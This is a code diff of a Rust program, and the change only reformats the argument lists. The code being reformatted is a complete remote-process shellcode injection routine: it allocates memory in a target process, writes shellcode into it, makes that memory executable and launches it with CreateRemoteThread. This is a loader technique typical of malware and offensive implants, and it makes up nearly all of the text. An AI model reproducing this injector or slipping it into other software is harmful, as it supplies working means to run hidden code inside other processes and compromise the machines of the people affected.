@@ -38,8 +38,11 @@ fn main(args: *mut u8, len: usize) {
         }
 
         let remote_addr = VirtualAllocEx(
-            process, core::ptr::null(), shellcode.len(),
-            MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE,
+            process,
+            core::ptr::null(),
+            shellcode.len(),
+            MEM_COMMIT | MEM_RESERVE,
+            PAGE_READWRITE,
         );
         if remote_addr.is_null() {
             eprintln!("VirtualAllocEx failed: {}", GetLastError());
@@ -49,21 +52,35 @@ fn main(args: *mut u8, len: usize) {
 
         let mut written: usize = 0;
         if WriteProcessMemory(
-            process, remote_addr, shellcode.as_ptr() as *const _,
-            shellcode.len(), &mut written,
-        ) == 0 {
+            process,
+            remote_addr,
+            shellcode.as_ptr() as *const _,
+            shellcode.len(),
+            &mut written,
+        ) == 0
+        {
             eprintln!("WriteProcessMemory failed: {}", GetLastError());
             CloseHandle(process);
             return;
         }
 
         let mut old: u32 = 0;
-        VirtualProtectEx(process, remote_addr, shellcode.len(), PAGE_EXECUTE_READ, &mut old);
+        VirtualProtectEx(
+            process,
+            remote_addr,
+            shellcode.len(),
+            PAGE_EXECUTE_READ,
+            &mut old,
+        );
 
         let thread = CreateRemoteThread(
-            process, core::ptr::null(), 0,
+            process,
+            core::ptr::null(),
+            0,
             core::mem::transmute(remote_addr),
-            core::ptr::null(), 0, core::ptr::null_mut(),
+            core::ptr::null(),
+            0,
+            core::ptr::null_mut(),
         );
         if thread.is_null() {
             eprintln!("CreateRemoteThread failed: {}", GetLastError());
